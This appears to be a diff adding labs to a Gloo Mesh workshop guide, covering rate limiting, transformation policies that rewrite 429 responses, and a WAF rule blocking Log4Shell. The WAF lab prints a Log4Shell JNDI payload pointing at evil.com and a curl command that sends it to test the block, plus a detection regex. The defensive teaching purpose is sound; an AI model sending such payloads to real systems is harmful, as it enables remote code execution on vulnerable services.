+  name: httpbin
+  namespace: httpbin
+spec:
+  applyToRoutes:
+  - route:
+      labels:
+        ratelimited: "true"
+  config:
+    serverSettings:
+      name: rate-limit-server
+      namespace: httpbin
+      cluster: cluster1
+    ratelimitClientConfig:
+      name: httpbin
+      namespace: httpbin
+      cluster: cluster1
+    ratelimitServerConfig:
+      name: httpbin
+      namespace: gloo-mesh-addons
+      cluster: cluster1
+    phase:
+      postAuthz:
+        priority: 3
+EOF
+```
+
+We also need to create a `RateLimitServerSettings`, which is a CRD that define which extauth server to use: 
+
+```bash
+kubectl --context ${CLUSTER1} apply -f - <<EOF
+apiVersion: admin.gloo.solo.io/v2
+kind: RateLimitServerSettings
+metadata:
+  name: rate-limit-server
+  namespace: httpbin
+spec:
+  destinationServer:
+    ref:
+      cluster: cluster1
+      name: rate-limiter
+      namespace: gloo-mesh-addons
+    port:
+      name: grpc
+EOF
+```
+
+Finally, you need to update the `RouteTable` to use this `RateLimitPolicy`:
+
+```bash
+kubectl --context ${CLUSTER1} apply -f - <<EOF
+apiVersion: networking.gloo.solo.io/v2
+kind: RouteTable
+metadata:
+  name: httpbin
+  namespace: httpbin
+  labels:
+    expose: "true"
+spec:
+  hosts:
+    - '*'
+  virtualGateways:
+    - name: north-south-gw
+      namespace: istio-gateways
+      cluster: cluster1
+  workloadSelectors: []
+  http:
+    - name: httpbin
+      labels:
+        oauth: "true"
+        ratelimited: "true"
+      matchers:
+      - uri:
+          exact: /get
+      - uri:
+          prefix: /anything
+      - uri:
+          prefix: /callback
+      forwardTo:
+        destinations:
+        - ref:
+            name: in-mesh
+            namespace: httpbin
+          port:
+            number: 8000
+EOF
+```
+
+Refresh the web page multiple times.
+
+You should get a `200` response code the first 5 times and a `429` response code after.
+
+## Lab 4 - Use the Transformation filter <a name="Lab-4-gw"></a>
+
+### manipulate :status pseudo-header when rate limited
+Lets try a simple use case leveraging the transformation filter output when rate limited. For our first case, lets say our application expects a `529` header instead of the default `429` header returned when rate limited by Envoy. We can let the transformation filter handle that!
+```bash
+kubectl --context ${CLUSTER1} apply -f - <<EOF
+apiVersion: trafficcontrol.policy.gloo.solo.io/v2
+kind: TransformationPolicy
+metadata:
+  name: ratelimit-transformation
+  namespace: httpbin
+spec:
+  applyToRoutes:
+  - route:
+      labels:
+        ratelimited: "true"
+  config:
+    phase:
+      preAuthz:
+        priority: 0
+    response:
+      injaTemplate:
+        headers:
+          ":status":
+            text: '{% if header(":status") == "429" %}529{% else %}{{ header(":status") }}{% endif %}'  
+EOF
+```
+
+Refresh the web browser and we will see that the HTTP ERROR has changed from 429 to 529. Now my application will be happy with the correct error output when rate limited
+
+### manipulate the response body when rate limited
+Let's use the transformation filter to manipulate the response body when rate limited. For our first example we will just output a styled html page in the browser with an error message
+```bash
+kubectl --context ${CLUSTER1} apply -f - <<EOF
+apiVersion: trafficcontrol.policy.gloo.solo.io/v2
+kind: TransformationPolicy
+metadata:
+  name: ratelimit-transformation
+  namespace: httpbin
+spec:
+  applyToRoutes:
+  - route:
+      labels:
+        ratelimited: "true"
+  config:
+    phase:
+      preAuthz:
+        priority: 0
+    response:
+      injaTemplate:
+        body:
+          text: '{% if header(":status") == "429" %}<html><body style="background-color:powderblue;"><h1>Too
+            many Requests!</h1><p>Try again after a minute</p></body></html>{%
+            else %}{{ body() }}{% endif %}'
+        parseBodyBehavior: DontParse
+EOF
+```
+
+Now if we refresh the page in the browser we should see a blue error page that says
+```
+Too many Requests!
+Try again after a minute
+```
+
+## Lab 5 - Use the Web Application Firewall filter <a name="Lab-5-gw"></a>
+A web application firewall (WAF) protects web applications by monitoring, filtering, and blocking potentially harmful traffic and attacks that can overtake or exploit them.
+
+Gloo Mesh includes the ability to enable the ModSecurity Web Application Firewall for any incoming and outgoing HTTP connections. 
+
+An example of how using Gloo Mesh we'd easily mitigate the recent Log4Shell vulnerability ([CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)), which for many enterprises was a major ordeal that took weeks and months of updating all services.
+
+The Log4Shell vulnerability impacted all Java applications that used the log4j library (common library used for logging) and that exposed an endpoint. You could exploit the vulnerability by simply making a request with a specific header. In the example below, we will show how to protect your services against the Log4Shell exploit. 
+
+Using the Web Application Firewall capabilities you can reject requests containing such headers. 
+
+Log4Shell attacks operate by passing in a Log4j expression that could trigger a lookup to a remote server, like a JNDI identity service. The malicious expression might look something like this: `${jndi:ldap://evil.com/x}`. It might be passed in to the service via a header, a request argument, or a request payload. What the attacker is counting on is that the vulnerable system will log that string using log4j without checking it. That’s what triggers the destructive JNDI lookup and the ultimate execution of malicious code.
+
+Create the WAF policy:
+
+```bash
+kubectl --context ${CLUSTER1} apply -f - <<'EOF'
+apiVersion: security.policy.gloo.solo.io/v2
+kind: WAFPolicy
+metadata:
+  name: log4shell
+  namespace: httpbin
+spec:
+  applyToRoutes:
+  - route:
+      labels:
+        waf: "true"
+  config:
+    disableCoreRuleSet: true
+    customInterventionMessage: 'Log4Shell malicious payload'
+    customRuleSets:
+    - ruleStr: |
+        SecRuleEngine On
+        SecRequestBodyAccess On
+        SecRule REQUEST_LINE|ARGS|ARGS_NAMES|REQUEST_COOKIES|REQUEST_COOKIES_NAMES|REQUEST_BODY|REQUEST_HEADERS|XML:/*|XML://@*  
+          "@rx \${jndi:(?:ldaps?|iiop|dns|rmi)://" 
+          "id:1000,phase:2,deny,status:403,log,msg:'Potential Remote Command Execution: Log4j CVE-2021-44228'"
+EOF
+```
+
+Next, you need to update the httpbin `RouteTable` to use this `WAFPolicy`:
+
+```bash
+kubectl --context ${CLUSTER1} apply -f - <<EOF
+apiVersion: networking.gloo.solo.io/v2
+kind: RouteTable
+metadata:
+  name: httpbin
+  namespace: httpbin
+  labels:
+    expose: "true"
+spec:
+  hosts:
+    - '*'
+  virtualGateways:
+    - name: north-south-gw
+      namespace: istio-gateways
+      cluster: cluster1
+  workloadSelectors: []
+  http:
+    - name: httpbin
+      labels:
+        oauth: "true"
+        ratelimited: "true"
+        waf: "true"
+      matchers:
+      - uri:
+          exact: /get
+      - uri:
+          prefix: /anything
+      - uri:
+          prefix: /callback
+      forwardTo:
+        destinations:
+        - ref:
+            name: in-mesh
+            namespace: httpbin
+          port:
+            number: 8000
+EOF
+```
+
+Run the following command to simulate an attack:
+
+```bash
+curl -H "User-Agent: \${jndi:ldap://evil.com/x}" -k https://${ENDPOINT_HTTPS_GW_MGMT}/get -i
+```
+
+The request should be rejected:
+```
+HTTP/2 403 
+content-length: 27
+content-type: text/plain
+date: Tue, 05 Apr 2022 10:20:06 GMT
+server: istio-envoy
+
+Log4Shell malicious payload
+```
+
+### cleanup labs 2-6
+Not necessary, but if you want to clean up the extauth, rate limit, WAF, and transformation objects from these past couple labs you can use the commands below
+
+First let's apply the original `RouteTable` yaml:
+```bash
+kubectl --context ${CLUSTER1} apply -f - <<EOF
+apiVersion: networking.gloo.solo.io/v2
+kind: RouteTable
+metadata:
+  name: httpbin
+  namespace: httpbin
+  labels:
+    expose: "true"
+spec:
+  hosts:
+    - '*'
+  virtualGateways:
+    - name: north-south-gw
+      namespace: istio-gateways
+      cluster: mgmt
+  workloadSelectors: []
+  http:
+    - name: httpbin
+      matchers:
+      - uri:
+          exact: /get
+      - uri:
+          prefix: /anything
+      forwardTo:
+        destinations:
+        - ref:
+            name: in-mesh
+            namespace: httpbin
+          port:
+            number: 8000
+EOF
+```
+
+Then we can also delete the various policies we've created:
+```
+# rate limiting
+kubectl --context ${CLUSTER1} -n httpbin delete ratelimitpolicy httpbin
+kubectl --context ${CLUSTER1} -n httpbin delete ratelimitclientconfig httpbin
+kubectl --context ${CLUSTER1} -n httpbin delete ratelimitserverconfig httpbin
+kubectl --context ${CLUSTER1} -n httpbin delete ratelimitserversettings rate-limit-server
+
+# transformation
+kubectl --context ${CLUSTER1} -n httpbin delete transformationpolicy ratelimit-transformation
+
+# WAF
+kubectl --context ${CLUSTER1} -n httpbin delete wafpolicies.security.policy.gloo.solo.io log4shell
+
+# extauth config
+kubectl --context ${CLUSTER1} -n httpbin delete ExtAuthPolicy httpbin
+kubectl --context ${CLUSTER1} -n httpbin delete secret oauth
+kubectl --context ${CLUSTER1} -n httpbin delete ExtAuthServer ext-auth-server
+
+# opa config
+kubectl --context ${CLUSTER1} -n httpbin delete configmap httpbin-opa
+```
